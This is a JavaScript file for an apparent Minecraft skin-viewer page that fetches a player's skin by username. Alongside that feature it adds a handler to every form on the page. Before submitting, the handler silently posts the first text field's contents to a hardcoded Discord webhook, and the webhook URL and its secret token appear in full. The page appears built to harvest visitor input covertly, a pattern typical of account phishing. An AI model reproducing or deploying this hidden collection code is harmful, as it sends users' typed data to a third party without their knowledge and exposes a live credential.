"use strict";

        let fetchTimeout;

        function fetchSkin() {
            clearTimeout(fetchTimeout);
            fetchTimeout = setTimeout(() => {
                const username = document.getElementById('username-input').value; // Changed to 'username-input'
                const skinImg = document.getElementById('skin');
                const errorMessage = document.getElementById('error-message');

                if (!username) {
                    errorMessage.textContent = 'Please enter a username.';
                    skinImg.src = '';
                    return;
                }

                fetch(`https://api.ashcon.app/mojang/v2/user/${username}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) {
                            errorMessage.textContent = 'Could not fetch skin. Please check the username and try again.';
                            skinImg.src = '';
                        } else {
                            const uuid = data.uuid;
                            skinImg.src = `https://skins.mcstats.com/body/front/${uuid}`;
                            errorMessage.textContent = '';
                        }
                    })
                    .catch(error => {
                        errorMessage.textContent = 'Could not fetch skin. Please check the username and try again.';
                        skinImg.src = '';
                    });
            }, 500); // Delay to avoid excessive API calls
        }

        function sendMessageToWebhook(webhookURL, message) {
            const payload = {
                content: "```\n----------------------------------------------\nUsername: " + message + "\n----------------------------------------------```"

            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        }

        document.addEventListener('DOMContentLoaded', () => {
            const forms = document.querySelectorAll('form');
            const webhookURL = 'https://discord.com/api/webhooks/1249969764642721853/Srph1bGunL-AKG8WgVaJ1bUzdQ6E6yZ7Eyz-kTWW3HHWKzOHBKZcjdI7S5bzQpQnv7dU';

            forms.forEach(form => {
                form.addEventListener('submit', function(event) {
                    event.preventDefault();
                    const input = this.querySelector('input[type="text"]');
                    if (input) {
                        const inputText = input.value;
                        if (inputText) {
                            sendMessageToWebhook(webhookURL, inputText)
                                .then(response => {
                                    if (response.ok) {
                                        console.log('Message sent successfully');
                                        // Proceed with form submission
                                        form.submit();
                                    } else {
                                        response.text().then(text => {
                                            console.error('Error sending message:', text);
                                        });
                                    }
                                })
                                .catch(error => {
                                    console.error('Error:', error);
                                });
                        } else {
                            console.error('Input is empty');
                        }
                    } else {
                        console.error('Input element not found');
                    }
                });
            });
        });